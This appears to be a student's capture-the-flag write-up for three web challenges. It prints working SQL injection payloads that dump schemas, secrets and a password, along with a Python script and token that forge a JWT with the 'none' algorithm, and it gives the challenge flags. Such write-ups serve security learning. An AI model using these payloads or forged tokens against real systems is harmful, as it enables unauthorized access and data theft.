# 1. Database Incursion V2

Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

- i used UNION operator based injections to get through the initial login page to get the employee list.Then as hinted i searched for Management department employee then found that Kiwi had the passcode but i found multiple Kiwis. So i filtered out the one from the Management and got the passcode to the admin panel.Then i figured out the number of columns as 4 and then i extracted the schemas. Then found that CITADEL_ARCHIVE_2077 had the flag in archive data so i used a payload to show that and got the flag.


<img width="773" height="619" alt="image" src="https://github.com/user-attachments/assets/a6480a39-39f2-40ec-83c6-a34d811b3d23" />

For this payload 
```bash
' UNION SELECT ID, Name, Department, Email, Notes FROM employees WHERE Name LIKE '%Kiwi%' AND Department='Management' --
```

<img width="1887" height="493" alt="image" src="https://github.com/user-attachments/assets/ab2ed0fd-39e3-40e8-a164-947e244a9f87" />

The admin panel:
<img width="1899" height="740" alt="image" src="https://github.com/user-attachments/assets/ce5be425-fc94-45f9-8e6a-204831473325" />

<img width="1843" height="525" alt="image" src="https://github.com/user-attachments/assets/46db902e-444d-4b6f-8b24-d767c2a719e3" />

For this payload 
```bash
' UNION SELECT 1, name, sql, 'schema' FROM sqlite_master --
```
<img width="1883" height="592" alt="image" src="https://github.com/user-attachments/assets/e9e00859-8a52-40c8-9a3a-aeb544ab2150" />

For this payload 
```bash
' UNION SELECT secrets, 'archive data', '', '' FROM "CITADEL_ARCHIVE_2077" --
```
<img width="1849" height="498" alt="image" src="https://github.com/user-attachments/assets/b8774394-7669-4285-89a7-012176118a16" />

## Flag:

```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- I learned how to use specific sql injections after carefully understanding each error. 

## Notes:

- i kept trying with MySQL database injections but they kept failing so then changin those to SQLite worked.I assumed some number of columns without counting so that kept giving error.

## Resources:

-  (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

# 2 . Temporal Token

I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

- i tried to login with the given id but it returned token expired so i used inspect tool and viewed the token value. This value was a  JWT format token. So i tried checking if the token were being verified and found it wasn't doing that. So using jwt library in python i set the algorithm to none and printed the jwt token with subject as Belegar. Then i changed the token value in the website and refresh it to get the flag.

The JWT token generating script:
```python
import jwt  
payload = {"sub": "Belegar","exp": 9999 }
token = jwt.encode(payload, key="", algorithm="none")
print(token)
```
The output token for this script:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjo5OTk5OTk5OTk5fQ.
```

After changing the token value to the obtained jwt token from python script:
<img width="1904" height="657" alt="image" src="https://github.com/user-attachments/assets/61414c45-29d7-41c4-96df-a452f295e44d" />

## Flag:

```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?
```

## Concepts learnt:

- I learned how JWT is made using different algorithms and how weak verification codes for JWT token can be exploited.

## Notes:

- i kept messing up the python script for token generation and learnt about the none algorithm attack from the resource below.

## Resources:

-  https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html

# 3. Oneshot

Directly access the challenge server at https://pacman-git-master-mrrobot404s-projects.vercel.app

## Solution:

- i started a new session and got the session id from the page source. Then i passes a sql inection to get each letter of the password using substr() and UNION ALL operator. I joined all 32 queries into one payload and passed it to get each character. Then i entered the password in /guess to get the flag.  

The single SQL injection payload for getting each character of the password: 
```
 ' AND '1'='0' UNION ALL  SELECT substr(password,1,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,2,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,3,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,4,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,5,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,6,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,7,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,8,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,9,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,10,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,11,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,12,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,13,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,14,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,15,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,16,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,17,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,18,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,19,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,20,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,21,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,22,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,23,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,24,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,25,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,26,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,27,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,28,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,29,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,30,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,31,1) FROM table_74b43018a40df3c0 UNION ALL SELECT substr(password,32,1) FROM table_74b43018a40df3c0 -- 
```

<img width="660" height="149" alt="image" src="https://github.com/user-attachments/assets/aea5c60c-ce5f-442c-8c3d-e2a93e5d3097" />

## Flag:

```
nite{are_you_feeling_the_heat_now :)}
```

## Concepts learnt:

- I learned how substr() and UNION ALL can be used in the payload.

## Notes:

- i kept trying different payloads but it kept giving only the starting character along with 31 asteriks.

## Resources:

-  https://www.w3schools.com/sql/func_mysql_substr.asp




